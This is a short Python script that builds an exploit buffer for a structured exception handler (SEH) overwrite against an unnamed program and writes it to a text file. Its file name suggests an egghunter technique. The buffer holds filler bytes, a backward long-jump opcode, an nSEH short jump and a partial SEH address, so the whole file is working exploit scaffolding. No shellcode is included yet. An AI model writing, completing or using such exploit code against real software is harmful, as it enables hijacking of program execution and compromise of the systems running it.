#!/usr/bin/python
import struct

file2="egghpayload.txt"

longJump = "\xE9\xBF\xFD\xFF\xFF"


nSEH = "\xEB\xF9\x90\x90" # Jump back 5 bytes
SEH  = "\x4b\x4d\x47"     # 0x00474d4b

egghpayload  = "A" * 6
egghpayload += "B" * 101
egghpayload += "C" * 572
egghpayload += longJump
egghpayload += nSEH
egghpayload += SEH
#egghpayload += "D" * (5000 - len(egghpayload))


textfile = open(file2 , 'w')
textfile.write(egghpayload)
textfile.close()

